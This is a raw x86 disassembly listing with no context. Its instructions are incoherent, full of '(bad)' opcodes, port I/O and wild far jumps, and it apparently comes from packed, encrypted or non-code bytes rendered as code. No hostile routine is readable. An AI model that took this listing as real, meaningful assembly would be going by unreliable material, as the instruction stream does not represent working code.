  40292a:	sbb    edi,DWORD PTR [edx]
  40292c:	inc    ecx
  40292d:	fwait
  40292e:	in     al,dx
  40292f:	jo     0x402944
  402931:	cmp    ebp,edi
  402933:	or     edi,DWORD PTR [eax]
  402935:	adc    eax,0xeff18305
  40293a:	call   0xde3f68f2
  40293f:	or     DWORD PTR [ebx-0x1b],eax
  402942:	xlat   BYTE PTR ds:[ebx]
  402943:	adc    BYTE PTR [ecx+0x54],ch
  402946:	(bad)  
  402947:	icebp  
  402948:	xchg   edx,eax
  402949:	(bad)  
  40294a:	lahf   
  40294b:	fisttp DWORD PTR [eax-0x2d21ca63]
  402951:	ins    BYTE PTR es:[edi],dx
  402952:	adc    bl,al
  402954:	repnz retf 0xbf
  402958:	cli    
  402959:	mov    edx,DWORD PTR [esi+0x3c6fd9ca]
  40295f:	fild   WORD PTR [edx]
  402961:	push   ds
  402962:	popa   
  402963:	sbb    BYTE PTR [edi],dh
  402965:	inc    esp
  402966:	mov    esp,0x976bf974
  40296b:	add    BYTE PTR [edi],cl
  40296d:	and    eax,0xc37e7de9
  402972:	adc    edi,DWORD PTR ds:0x83404797
  402978:	sbb    al,0x32
  40297a:	mov    esp,0x40edfefb
  40297f:	or     dh,dh
  402981:	xor    dl,bh
  402983:	and    BYTE PTR [ebx],ah
  402985:	(bad)  
  402987:	out    dx,eax
  402988:	in     eax,0x76
  40298a:	cdq    
  40298b:	loop   0x402994
  40298d:	lock clc 
  40298f:	je     0x402993
  402991:	rcl    ah,cl
  402993:	ror    BYTE PTR [edx+0x5d],1
  402996:	addr16 dec edi
  402998:	sbb    eax,0xd4bb2210
  40299d:	stc    
  40299e:	sub    bl,BYTE PTR [esp+eax*1]
  4029a1:	jmp    0xbe8e1758
  4029a6:	push   esp
  4029a7:	mov    ch,0x98
  4029a9:	pop    ebx
  4029aa:	xchg   esp,eax
  4029ab:	jmp    0xf2ce:0xd1eac1f1
  4029b2:	mov    ebp,0x3c958b9c
  4029b7:	popa   
  4029b8:	jle    0x4029f8
  4029ba:	clc    
  4029bb:	sahf   
  4029bc:	mov    edi,0x869c7e9e
  4029c1:	xor    ecx,DWORD PTR [eax+ecx*1+0x2eddffc9]
  4029c8:	adc    esp,ebp
  4029ca:	sbb    BYTE PTR [ebx-0x11052351],al
  4029d0:	scas   eax,DWORD PTR es:[edi]
  4029d1:	mov    dh,0x45
  4029d3:	dec    ebx
  4029d4:	lods   al,BYTE PTR ds:[esi]
  4029d5:	stc    
  4029d6:	jno    0x4029d8
  4029d8:	repnz push esi
  4029da:	scas   eax,DWORD PTR es:[edi]
  4029db:	or     eax,0xffffffe8
  4029de:	into   
  4029df:	retf   0xd164
  4029e2:	hlt    
  4029e3:	test   BYTE PTR [edi-0x4c3decad],dl
  4029e9:	fdivr  QWORD PTR ds:0x143de3cb
  4029ef:	mov    eax,0xfb05ef8
  4029f4:	pop    esp
  4029f5:	and    eax,0x522d1cdc
  4029fa:	inc    esi
  4029fb:	jbe    0x4029c3
  4029fd:	test   DWORD PTR [ecx],esi
  4029ff:	sti    
  402a00:	mov    dl,0xef
  402a02:	les    ebp,FWORD PTR [ecx]
  402a04:	push   edx
  402a05:	je     0x402a68
  402a07:	cmp    al,0x37
  402a09:	int    0xc5
  402a0b:	jo     0x402992
  402a0d:	mov    ebx,0x2635233c
  402a12:	aam    0x18
  402a14:	in     al,0x87
  402a16:	xchg   DWORD PTR [ebx],edi
  402a18:	ja     0x402a43
  402a1a:	(bad)  
  402a1b:	das    
  402a1c:	cli    
  402a1d:	pop    ds
  402a1e:	dec    ecx
  402a1f:	loopne 0x402a62
  402a21:	sub    BYTE PTR [esi-0x646bf011],0x6a
  402a28:	out    dx,eax
  402a29:	int    0x31
  402a2b:	or     eax,0x7044c387
  402a30:	mov    al,ds:0x9fb0e026
  402a35:	out    0x85,al
  402a37:	push   edx
  402a38:	mov    ah,0x59
  402a3a:	mov    ch,0xf1
  402a3c:	push   edi
  402a3d:	pop    edx
  402a3e:	jecxz  0x402a66
  402a40:	mov    DWORD PTR [eax+0xcd0ef76],ebx
  402a46:	imul   esi,DWORD PTR [ebp+eiz*4-0x61],0xffffffee
  402a4b:	xchg   edi,eax
  402a4c:	and    al,0xde
  402a4e:	les    ebp,FWORD PTR [ebx+0x74]
  402a51:	mov    dl,0xad
  402a53:	fdiv   QWORD PTR [edx]
  402a55:	hlt    
  402a56:	mov    dl,0x80
  402a58:	jbe    0x402a3e
  402a5a:	test   DWORD PTR [edx],0x480fae02
  402a60:	ret    
  402a61:	or     eax,0x6952f56a
  402a66:	fdiv   st,st(2)
  402a68:	nop
  402a69:	adc    ah,BYTE PTR [esi]
  402a6b:	and    bh,BYTE PTR [esi+0x7d371904]
  402a71:	pusha  
  402a72:	push   es
  402a73:	or     ebx,DWORD PTR [ebx]
  402a75:	push   ds
  402a76:	mov    al,ds:0x4662ef15
  402a7b:	(bad)
  402a7e:	inc    edx
  402a7f:	out    0xd8,al
  402a81:	addr16 pusha 
  402a83:	std    
  402a84:	mov    ah,0x39
  402a86:	aad    0xc4
  402a88:	cmp    BYTE PTR ds:0xcd4a059d,cl
  402a8e:	xlat   BYTE PTR ds:[ebx]
  402a8f:	cmp    cl,cl
  402a91:	mov    ecx,0x825b2ea2
  402a96:	mov    BYTE PTR [eax+0x4fdb49a8],dl
  402a9c:	mov    esp,0x9c9116a3
  402aa1:	repz inc esp
  402aa3:	imul   esp,edi,0xf01a1898
  402aa9:	xor    esp,ecx
  402aab:	xchg   ecx,eax
  402aac:	aaa    
  402aad:	push   es
  402aae:	inc    eax
  402aaf:	int3   
  402ab0:	cli    
  402ab1:	fld    QWORD PTR [ebx-0x2d]
  402ab4:	scas   eax,DWORD PTR es:[edi]
  402ab5:	rcr    BYTE PTR [edi+0x21],1
  402ab8:	or     ebp,DWORD PTR [ecx-0x610cffc9]
  402abe:	scas   eax,DWORD PTR es:[edi]
  402abf:	lods   al,BYTE PTR ds:[esi]
  402ac0:	mov    eax,ds:0x5fc9f9ed
  402ac5:	adc    eax,0x7cfb1dfc
  402aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402acb:	fsubr  QWORD PTR [eax-0x426f6c43]
  402ad1:	and    edx,DWORD PTR [ebp-0x131f3c49]
  402ad7:	fucomp st(7)
  402ad9:	sbb    bl,BYTE PTR [eax+edx*1]
  402adc:	icebp  
  402add:	cs xchg ebp,eax
  402adf:	or     al,0x62
  402ae1:	dec    ebx
  402ae2:	and    BYTE PTR [edi+0x691cdeb1],bh
  402ae8:	icebp  
  402ae9:	mov    eax,ds:0xc9a1bd3
  402aee:	int    0x7f
  402af0:	jbe    0x402aec
  402af2:	(bad)  
  402af3:	jb     0x402a96
  402af5:	mov    ah,0xaf
  402af7:	std    
  402af8:	jl     0x402a7f
  402afa:	pop    ebx
  402afb:	push   ebp
  402afc:	mov    dh,0xfa
  402afe:	ins    DWORD PTR es:[edi],dx
  402aff:	inc    ecx
  402b00:	pop    ds
  402b01:	pushf  
  402b02:	cdq    
  402b03:	adc    DWORD PTR [edx-0x53aec050],edx
  402b09:	xor    al,0x2c
  402b0b:	cwde   
  402b0c:	pop    edi
  402b0d:	xor    BYTE PTR [eax+edx*2+0x5a],0xca
  402b12:	push   ds
  402b13:	rcr    BYTE PTR [eax-0x24],cl
  402b16:	pop    esp
  402b17:	stc    
  402b18:	mov    edi,0xcda2145b
  402b1d:	outs   dx,BYTE PTR ds:[esi]
  402b1e:	adc    BYTE PTR [ecx+0x7796b654],dh
  402b24:	xchg   eax,edx
  402b26:	dec    ebx
  402b27:	pop    ebp
  402b28:	and    DWORD PTR [edi-0x15],ecx
  402b2b:	adc    BYTE PTR [ebx+0x18],bl
  402b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b2f:	addr16 cmc 
  402b31:	retf   
  402b32:	or     al,BYTE PTR ds:0x93c9124c
  402b38:	or     DWORD PTR [edx+0x3e],ebp
  402b3b:	mov    ebx,0xb168ad75
  402b40:	xlat   BYTE PTR ds:[ebx]
  402b41:	(bad)  
  402b42:	fimul  DWORD PTR [ecx-0x8]
  402b45:	out    0xac,eax
  402b47:	outs   dx,BYTE PTR ds:[esi]
  402b48:	aad    0xbf
  402b4a:	scas   eax,DWORD PTR es:[edi]
  402b4b:	pushf  
  402b4c:	stos   BYTE PTR es:[edi],al
  402b4d:	dec    edi
  402b4e:	aaa    
  402b4f:	jmp    0x402ba0
  402b51:	pop    ecx
  402b52:	sbb    eax,0x7b16f67b
  402b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b58:	jmp    0x71e617f9
  402b5d:	call   0x742e333
  402b62:	cld    
  402b63:	xchg   edx,eax
  402b64:	dec    DWORD PTR [eax]
  402b66:	icebp  
  402b67:	add    eax,0x9d05bbaf
  402b6c:	sbb    cl,BYTE PTR [edi+0x7c]
  402b6f:	dec    ebx
  402b70:	dec    edi
  402b71:	inc    esp
  402b72:	jnp    0x402b7d
  402b74:	mov    ah,0xe3
  402b76:	push   es
  402b77:	adc    BYTE PTR [eax+0x33975e73],al
  402b7d:	pop    ecx
  402b7e:	xor    BYTE PTR ds:0xc1ea992,ch
  402b84:	xor    eax,0x6de95c1a
  402b89:	inc    edi
  402b8a:	mov    esi,0x48c8ce05
  402b8f:	jmp    0x23ed6b71
  402b94:	shr    BYTE PTR [ecx+0x4150da5d],1
  402b9a:	or     ecx,DWORD PTR [ebp-0x72]
  402b9d:	sub    al,0x96
  402b9f:	stos   BYTE PTR es:[edi],al
  402ba0:	jns    0x402b96
  402ba2:	push   eax
  402ba3:	js     0x402bdc
  402ba5:	inc    ebx
  402ba6:	add    BYTE PTR [edi],cl
  402ba8:	pop    ss
  402ba9:	push   esi
  402baa:	jg     0x402b68
  402bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bad:	push   ecx
  402bae:	call   0xebb:0xa7d7781e
  402bb5:	stos   BYTE PTR es:[edi],al
  402bb6:	adc    esi,DWORD PTR [edi+0x7001d233]
  402bbc:	mov    esp,0x388fba67
  402bc1:	pop    esp
  402bc2:	call   0x90cd:0xe97939c1
  402bc9:	mov    DWORD PTR [edi-0x4e],edi
  402bcc:	aas    
  402bcd:	pop    ebp
  402bce:	mov    fs,WORD PTR [ecx+0x483b5ade]
  402bd4:	add    eax,0x7ff1d011
  402bd9:	push   edi
  402bda:	push   esp
  402bdb:	shl    ebp,1
  402bdd:	test   BYTE PTR [edx+0x2463426c],dh
  402be3:	or     eax,0x31182644
  402be8:	rcl    DWORD PTR [esi-0x9923e72],cl
  402bee:	xlat   BYTE PTR ds:[ebx]
  402bef:	push   ebp
  402bf0:	rcl    DWORD PTR [esi+0x20],cl
  402bf3:	inc    ebp
  402bf4:	add    ch,BYTE PTR [ebx]
  402bf6:	cwde   
  402bf7:	pop    es
  402bf8:	sbb    ebp,esi
  402bfa:	push   esi
  402bfb:	mov    bh,0xa
  402bfd:	add    ch,BYTE PTR [edx-0x2585f727]
  402c03:	xchg   cl,bh
  402c05:	iret   
  402c06:	jmp    0x51a5:0x6d0d5490
  402c0d:	(bad)  
  402c0e:	mov    cl,0x94
  402c10:	and    eax,0xceb39da3
  402c15:	fwait
  402c16:	pop    ecx
  402c17:	push   ecx
  402c18:	in     eax,0x66
  402c1a:	or     esp,DWORD PTR ds:0x9daa6719
  402c20:	outs   dx,DWORD PTR ds:[esi]
  402c21:	ret    
  402c22:	jl     0x402c9d
  402c24:	int    0x2c
  402c26:	enter  0x1119,0x17
  402c2a:	stos   BYTE PTR es:[edi],al
  402c2b:	std    
  402c2c:	inc    edi
  402c2d:	pop    edx
  402c2e:	popa   
  402c2f:	inc    ebx
  402c30:	es dec ecx
  402c32:	and    edi,eax
  402c34:	iret   
  402c35:	sti    
  402c36:	test   DWORD PTR [edi+ebx*4-0x68],edx
  402c3a:	jno    0x402c22
  402c3c:	xchg   dh,al
  402c3e:	cdq    
  402c3f:	push   DWORD PTR ss:[esi-0x21]
  402c43:	cmp    eax,0x2b7fd7a7
  402c48:	jb     0x402c48
  402c4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c4b:	loopne 0x402c5d
  402c4d:	mov    ecx,0xfecc98ea
  402c52:	pop    ds
  402c53:	cmp    BYTE PTR [ebx],ch
  402c55:	imul   ebx,DWORD PTR [ebx+eiz*4],0xffffffb7
  402c59:	adc    al,0x40
  402c5b:	(bad)
  402c5e:	daa    
  402c5f:	jecxz  0x402cb2
  402c61:	fimul  WORD PTR [eax]
  402c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c64:	mov    ds:0xf5dc0b69,al
  402c69:	rcl    DWORD PTR [ecx-0x702602e1],0x51
  402c70:	pop    ss
  402c71:	lahf   
  402c72:	les    ebp,FWORD PTR [edx]
  402c74:	shl    DWORD PTR [ebx],cl
  402c76:	aas    
  402c77:	inc    ecx
  402c78:	xchg   BYTE PTR [ebp+0x64],al
  402c7b:	or     DWORD PTR ds:0x6cf0a549,edi
  402c81:	dec    esp
  402c82:	addr16 or al,0xfe
  402c85:	add    al,0xdb
  402c87:	repnz test eax,0x3b7b37c7
  402c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c8e:	lds    esp,FWORD PTR [ecx+0x3a8052f5]
  402c94:	xchg   edx,eax
  402c95:	xchg   esp,eax
  402c96:	and    edx,esp
  402c98:	(bad)  
  402c99:	retf   
  402c9a:	push   ss
  402c9b:	in     eax,dx
  402c9c:	nop
  402c9d:	(bad)  
  402c9e:	jnp    0x402c6d
  402ca0:	push   ecx
  402ca1:	les    ebx,FWORD PTR [edi-0x4f]
  402ca4:	jns    0x402ccb
  402ca6:	addr16 data16 sbb cl,al
  402caa:	mov    al,0xf3
  402cac:	mov    ch,0x2
  402cae:	xchg   edx,esi
  402cb0:	fisttp DWORD PTR [esi+0x78]
  402cb3:	push   cs
  402cb4:	nop
  402cb5:	push   ecx
  402cb6:	jne    0x402c6c
  402cb8:	jno    0x402ce1
  402cba:	imul   edx,ebp,0xc41635ff
  402cc0:	test   DWORD PTR [esi+ebp*4+0x6f],esi
  402cc4:	add    eax,0xeeab8577
  402cc9:	sub    edi,ebp
  402ccb:	cmp    BYTE PTR [ebx+0x3ad2ef7f],al
  402cd1:	push   ebp
  402cd2:	xor    al,0x3b
  402cd4:	and    al,BYTE PTR [edi]
  402cd6:	push   cs
  402cd7:	stos   DWORD PTR es:[edi],eax
  402cd8:	sub    al,0x8
  402cda:	call   0xcd3ff334
  402cdf:	in     al,0x4e
  402ce1:	sti    
  402ce2:	xchg   ecx,eax
  402ce3:	jmp    0x8658c3a3
  402ce8:	xlat   BYTE PTR cs:[ebx]
  402cea:	push   ebp
  402ceb:	sahf   
  402cec:	mov    ecx,0xe8130ba
  402cf1:	fisubr WORD PTR [eax-0x37f5f813]
  402cf7:	add    al,0x1
  402cf9:	sbb    al,0x4e
  402cfb:	repnz out 0x9,al
  402cfe:	dec    esp
  402cff:	inc    ebp
  402d00:	xor    BYTE PTR [edx-0x4a],0x98
  402d04:	mov    ds:0xfee1fac4,al
  402d09:	jp     0x402d5f
  402d0b:	fnstsw WORD PTR [ebx+ecx*2-0x3a431cb0]
  402d12:	fcmovnb st,st(1)
  402d14:	out    0x63,al
  402d16:	xchg   ebp,eax
  402d17:	arpl   WORD PTR [eax-0x60],bp
  402d1a:	imul   esp,DWORD PTR [edi-0x63],0x4830ca9
  402d21:	ret    0xf29d
  402d24:	pushf  
  402d25:	stos   DWORD PTR es:[edi],eax
  402d26:	cmc    
  402d27:	pop    esp
  402d28:	mov    fs,WORD PTR [ebp+0x54]
  402d2b:	pop    edx
  402d2c:	pop    ebp
  402d2d:	pop    es
  402d2e:	jmp    0xfd74f30
  402d33:	sub    ch,ah
  402d35:	cmp    esp,ecx
  402d37:	mov    bl,0xa3
  402d39:	int    0xc
  402d3b:	inc    ebx
  402d3c:	inc    BYTE PTR [edx]
  402d3e:	add    eax,0x77f1c8a7
  402d43:	mov    ch,0x2e
  402d45:	mov    ds:0x7c2c9131,eax
  402d4a:	iret   
  402d4b:	out    dx,eax
  402d4c:	or     eax,0xd0f97c99
  402d51:	mov    WORD PTR [ebx],gs
  402d53:	sub    eax,0x81f241d8
  402d58:	(bad)  
  402d59:	pop    edx
  402d5a:	xchg   edi,eax
  402d5b:	pop    eax
  402d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d5e:	pop    edi
  402d5f:	xor    DWORD PTR [esi+0x76],edi
  402d62:	jle    0x402d24
  402d64:	xor    eax,0x4981e02a
  402d69:	outs   dx,BYTE PTR ds:[esi]
  402d6a:	sub    BYTE PTR [edx],dh
  402d6c:	inc    esp
  402d6d:	or     al,0xf
  402d6f:	retf   
  402d70:	in     eax,0x78
  402d72:	scas   al,BYTE PTR es:[edi]
  402d73:	or     BYTE PTR [esi],al
  402d75:	shr    BYTE PTR [ebp+0x3c],cl
  402d78:	adc    BYTE PTR [eax+0x31f361b1],bh
  402d7e:	push   ss
  402d7f:	test   BYTE PTR [eax],0x68
  402d82:	ins    DWORD PTR es:[edi],dx
  402d83:	js     0x402df7
  402d85:	mov    ds:0x5a4dca01,al
  402d8a:	sbb    BYTE PTR [edi-0x38028a63],0x79
  402d91:	mov    al,ch
  402d93:	in     eax,0x7d
  402d95:	mov    cl,0xac
  402d97:	mov    ch,0xb3
  402d99:	scas   al,BYTE PTR es:[edi]
  402d9a:	sub    eax,DWORD PTR [edi+0x6f]
  402d9d:	fucomip st,st(1)
  402d9f:	xchg   DWORD PTR [ecx],edi
  402da1:	iret   
  402da2:	mov    esi,esi
  402da4:	enter  0x23ee,0xf6
  402da8:	mov    edi,0x1b763605
  402dad:	fwait
  402dae:	add    dh,bh
  402db0:	mov    ss,WORD PTR [eax-0x6]
  402db3:	cmp    bh,BYTE PTR [edx]
  402db5:	(bad)  
  402db7:	inc    edi
  402db8:	add    BYTE PTR [edx],ah
  402dba:	jmp    DWORD PTR [edi-0x42]
  402dbd:	or     DWORD PTR ds:0x52b82e3a,edx
  402dc3:	or     DWORD PTR [ebp+0x46],esp
  402dc6:	aam    0xf2
  402dc8:	xchg   esi,eax
  402dc9:	jno    0x402da1
  402dcb:	outs   dx,DWORD PTR ds:[esi]
  402dcc:	ja     0x402dbf
  402dce:	dec    edx
  402dcf:	xchg   ch,dl
  402dd1:	mov    dh,0x4a
  402dd3:	xor    eax,0x48e101d1
  402dd8:	in     eax,0xb8
  402dda:	nop
  402ddb:	or     eax,0x9823801b
  402de0:	mov    cl,0xf7
  402de2:	stc    
  402de3:	inc    ebx
  402de4:	inc    edx
  402de5:	xchg   esp,eax
  402de6:	mov    bl,0xe9
  402de8:	dec    esp
  402de9:	hlt    
  402dea:	mov    ebx,0x10e3014
  402def:	jle    0x402e15
  402df1:	(bad)  
  402df2:	fcomp  QWORD PTR [edi]
  402df4:	aam    0xe7
  402df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402df7:	adc    eax,0x58b09d87
  402dfc:	sub    bh,BYTE PTR [edi+0x10]
  402dff:	add    bh,cl
  402e01:	pop    ds
  402e02:	pop    es
  402e03:	mov    cl,0x8c
  402e05:	leave  
  402e06:	lahf   
  402e07:	daa    
  402e08:	pop    eax
  402e09:	push   ebp
  402e0a:	dec    esi
  402e0b:	sbb    al,0x3c
  402e0d:	enter  0x2f07,0x70
  402e11:	xchg   esi,eax
  402e12:	nop
  402e13:	and    al,0x14
  402e15:	sbb    edi,DWORD PTR [ebp+0x2d]
  402e18:	loop   0x402e13
  402e1a:	xor    al,0xb6
  402e1c:	pop    edx
  402e1d:	inc    esi
  402e1e:	jecxz  0x402e9b
  402e20:	fisubr WORD PTR [ebp+ecx*8-0x278112d7]
  402e27:	xor    eax,0x709a5f0c
  402e2c:	push   edx
  402e2d:	repz and dl,BYTE PTR [ebp-0x55]
  402e31:	retf   0xc333
  402e34:	and    ah,BYTE PTR [ebx]
  402e36:	mov    eax,ds:0x82317c45
  402e3b:	xchg   ch,dh
  402e3d:	jecxz  0x402e3f
  402e3f:	pusha  
  402e40:	inc    ebx
  402e41:	add    eax,0x905529b0
  402e46:	outs   dx,BYTE PTR ds:[esi]
  402e47:	sbb    al,0x97
  402e49:	daa    
  402e4a:	sub    al,0x3e
  402e4c:	lods   eax,DWORD PTR ds:[esi]
  402e4d:	fwait
  402e4e:	xchg   esi,eax
  402e4f:	push   edi
  402e50:	pop    ebx
  402e51:	loope  0x402e5d
  402e53:	dec    edi
  402e54:	(bad)  
  402e56:	stos   BYTE PTR es:[edi],al
  402e57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e58:	out    0x4b,eax
  402e5a:	fldcw  WORD PTR [ecx-0x60]
  402e5d:	cdq    
  402e5e:	jae    0x402e06
  402e60:	es push edi
  402e62:	nop
  402e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e64:	stos   DWORD PTR es:[edi],eax
  402e65:	popf   
  402e66:	es jo  0x402e40
  402e69:	pop    esp
  402e6a:	das    
  402e6b:	pop    esi
  402e6c:	jp     0x402e27
  402e6e:	fild   QWORD PTR [edx-0x1fbd1395]
  402e74:	inc    esp
  402e75:	jmp    0xc8bd:0xea549c0e
  402e7c:	jl     0x402e73
  402e7e:	add    DWORD PTR [eax+edx*1],eax
  402e81:	and    DWORD PTR [esp+ebp*4-0x79e75832],0x7632d402
  402e8c:	hlt    
  402e8d:	and    eax,0xef05bf55
  402e92:	mov    dl,0xf5
  402e94:	xchg   edi,edi
  402e96:	push   es
  402e97:	shr    dh,cl
  402e99:	mov    ds:0x4882a495,al
  402e9e:	cmp    BYTE PTR [esi-0x4af3c958],ah
  402ea4:	cmc    
  402ea5:	mov    dh,0xd3
  402ea7:	xor    BYTE PTR [edx+0x7fc4131e],bl
  402ead:	popf   
  402eae:	xchg   edx,eax
  402eaf:	jbe    0x402ebc
  402eb1:	add    al,0xd4
  402eb3:	jno    0x402f0a
  402eb5:	dec    esp
  402eb6:	ret    
  402eb7:	and    al,0x82
  402eb9:	inc    esp
  402eba:	sbb    DWORD PTR [ebx+ecx*4+0x50ae6e24],esp
  402ec1:	inc    BYTE PTR [edx]
  402ec3:	(bad)  
  402ec4:	stos   DWORD PTR es:[edi],eax
  402ec5:	push   0x9c6ac2f6
  402eca:	bound  ecx,QWORD PTR [edi+0x39]
  402ecd:	sbb    eax,DWORD PTR [ebx+0x68]
  402ed0:	ret    0x2857
  402ed3:	popf   
  402ed4:	add    BYTE PTR ds:0xd76573b0,bl
  402eda:	lds    edi,FWORD PTR [edx-0x187e008c]
  402ee0:	push   ss
  402ee1:	or     DWORD PTR [eax+esi*1-0x74],esp
  402ee5:	out    dx,al
  402ee6:	jp     0x402f0f
  402ee8:	fwait
  402ee9:	jno    0x402f56
  402eeb:	dec    esp
  402eec:	or     DWORD PTR [ebx],esi
  402eee:	sub    al,0xea
  402ef0:	das    
  402ef1:	test   BYTE PTR [edi+0x48],dl
  402ef4:	sti    
  402ef5:	rol    DWORD PTR [edi-0x63bc4500],0x30
  402efc:	push   ebp
  402efd:	(bad)  
  402efe:	cmp    eax,0x5c23802f
  402f03:	xor    BYTE PTR cs:0x67630143,0x12
  402f0b:	jne    0x402f54
  402f0d:	pop    ebp
  402f0e:	in     eax,dx
  402f0f:	je     0x402f4f
  402f11:	addr16 jae 0x402f2f
  402f14:	ins    BYTE PTR es:[edi],dx
  402f15:	mov    cl,0x1b
  402f17:	xchg   esi,eax
  402f18:	sar    BYTE PTR [esi],1
  402f1a:	outs   dx,BYTE PTR ds:[esi]
  402f1b:	inc    esi
  402f1c:	mov    al,0xa6
  402f1e:	loope  0x402efb
  402f20:	cdq    
  402f21:	(bad)  
  402f22:	mov    ebx,0x13cbe946
  402f27:	cmp    ecx,DWORD PTR [ecx]
  402f29:	xchg   ebx,eax
  402f2a:	xlat   BYTE PTR ds:[ebx]
  402f2b:	mov    edi,0xb44d8b54
  402f30:	int3   
  402f31:	shl    DWORD PTR [esi+0x2dcd2068],cl
  402f37:	add    eax,0xbabeb7f4
  402f3c:	stos   DWORD PTR es:[edi],eax
  402f3d:	(bad)  [eax-0x2e]
  402f40:	adc    BYTE PTR [bp+di-0x7d],al
  402f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f45:	in     eax,dx
  402f46:	hlt    
  402f47:	xchg   al,al
  402f49:	adc    ch,BYTE PTR [ebx+0x8]
  402f4c:	mov    DWORD PTR [eax-0x54],edi
  402f4f:	mov    ebx,0xf524c442
  402f54:	int3   
  402f55:	and    BYTE PTR [edi],ah
  402f57:	mov    edx,0x77a5a5df
  402f5c:	cmc    
  402f5d:	adc    bl,BYTE PTR [ecx-0x21]
  402f60:	jle    0x402fcf
  402f62:	add    al,0xfd
  402f64:	test   ebp,esp
  402f66:	in     al,dx
  402f67:	push   ebp
  402f68:	mov    al,0x5a
  402f6a:	stos   DWORD PTR es:[edi],eax
  402f6b:	pop    ebx
  402f6c:	nop
  402f6d:	sbb    ch,BYTE PTR [ecx+ebx*2-0x75a63e29]
  402f74:	push   0x78
  402f76:	push   eax
  402f77:	xor    cl,BYTE PTR [eax-0x58b88cc7]
  402f7d:	xchg   BYTE PTR [esi-0x18],dh
  402f80:	loopne 0x402ffd
  402f82:	clc    
  402f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f84:	sbb    DWORD PTR [edi+edx*2],0x807ed9fe
  402f8b:	lods   al,BYTE PTR ds:[esi]
  402f8c:	push   edi
  402f8d:	dec    edi
  402f8e:	mov    esp,0xd917dbda
  402f93:	rcl    bh,cl
  402f95:	pop    edi
  402f96:	call   0xd53e8b4d
  402f9b:	fiadd  DWORD PTR [edi-0x61]
  402f9e:	mov    ds:0x8a09f69e,al
  402fa3:	mov    edi,0x5114d88c
  402fa8:	push   edi
  402fa9:	mov    bl,0x79
  402fab:	out    dx,eax
  402fac:	cmp    ah,al
  402fae:	outs   dx,BYTE PTR ds:[esi]
  402faf:	aad    0xd5
  402fb1:	loop   0x402f85
  402fb3:	lahf   
  402fb4:	fs sti 
  402fb6:	ror    BYTE PTR [eax+0x34e2c5c],1
  402fbc:	popa   
  402fbd:	stos   BYTE PTR es:[edi],al
  402fbe:	js     0x402f70
  402fc0:	mov    dh,0x2b
  402fc2:	addr16 aas 
  402fc4:	loopne 0x403038
  402fc6:	ret    
  402fc7:	repnz fcomp DWORD PTR [eax-0x1c89ae2d]
  402fce:	inc    edi
  402fcf:	adc    BYTE PTR [edx+esi*1+0x38ac105e],ch
  402fd6:	add    eax,0x44889af5
  402fdb:	jnp    0x402faf
  402fdd:	ficom  WORD PTR [ecx+ebp*2+0x1b68268a]
  402fe4:	fmul   DWORD PTR [ebx]
  402fe6:	(bad)  
  402fe7:	sub    BYTE PTR gs:[ebx+ebp*1-0x155b824],dl
  402fef:	add    DWORD PTR [edi-0x3852ffdc],esp
  402ff5:	test   al,0x77
  402ff7:	out    0xb1,al
  402ff9:	xchg   BYTE PTR [ecx-0x5c],dh
  402ffc:	test   DWORD PTR [edi+0x51],ecx
  402fff:	cmp    dh,BYTE PTR [edi]
  403001:	mov    bl,0x62
  403003:	arpl   WORD PTR [ecx-0x72005a34],bp
  403009:	xor    DWORD PTR [edi],ebp
  40300b:	popf   
  40300c:	jecxz  0x403079
  40300e:	ja     0x402f9d
  403010:	xchg   ebp,eax
  403011:	and    al,0xbe
  403013:	(bad)  
  403014:	leave  
  403015:	mov    eax,eax
  403017:	stos   BYTE PTR es:[edi],al
  403018:	cdq    
  403019:	inc    ebp
  40301a:	fdiv   st(4),st
  40301c:	aam    0x93
  40301e:	test   al,0x26
  403020:	retf   
  403021:	mov    bl,0x32
  403023:	jmp    0xfa5437cb
  403028:	outs   dx,BYTE PTR ds:[esi]
  403029:	ins    DWORD PTR es:[edi],dx
  40302a:	or     DWORD PTR [ebx],esp
  40302c:	nop
  40302d:	aas    
  40302e:	(bad)  
  403030:	pop    edi
  403031:	scas   eax,DWORD PTR es:[edi]
  403032:	mov    eax,0xc7bf75f4
  403037:	paddusw mm0,QWORD PTR [esi-0x31c7fbe4]
  40303e:	sbb    DWORD PTR [eax],esi
  403040:	out    0xb,al
  403042:	and    eax,0xf4dea852
  403047:	jg     0x402ffc
  403049:	inc    edx
  40304a:	outs   dx,DWORD PTR ds:[esi]
  40304b:	xor    al,0x80
  40304d:	xor    dl,0x63
  403050:	sub    eax,0x18bac2ae
  403055:	fldcw  WORD PTR [ebx+0x72]
  403058:	pop    eax
  403059:	mov    ah,0x6
  40305b:	xchg   esi,eax
  40305c:	inc    eax
  40305d:	mov    edi,esi
  40305f:	pop    ebp
  403060:	mov    ecx,0x9e040948
  403065:	pop    ecx
  403066:	inc    edi
  403067:	inc    eax
  403068:	aam    0x47
  40306a:	push   cs
  40306b:	fimul  DWORD PTR cs:[ebx]
  40306e:	dec    esp
  40306f:	cdq    
  403070:	inc    edx
  403071:	adc    esi,DWORD PTR [ecx+ebp*2-0x21]
  403075:	das    
  403076:	dec    eax
  403077:	xor    ebp,DWORD PTR [edx]
  403079:	push   ebp
  40307a:	add    al,0xcc
  40307c:	test   cl,ah
  40307e:	sub    eax,DWORD PTR gs:[edi]
  403081:	cmp    al,0x83
  403083:	out    dx,eax
  403084:	fcmovbe st,st(0)
  403086:	inc    DWORD PTR [ebx+ebp*1-0x46]
  40308a:	add    ah,0x51
  40308d:	fbld   TBYTE PTR [edi-0x53]
  403090:	adc    ebx,esp
  403092:	pop    esi
  403093:	stos   DWORD PTR es:[edi],eax
  403094:	add    eax,0x1d02051
  403099:	sub    DWORD PTR [ebx+0x4b12e599],0x1e
  4030a0:	mov    eax,0xa9c1916d
  4030a5:	repz cli 
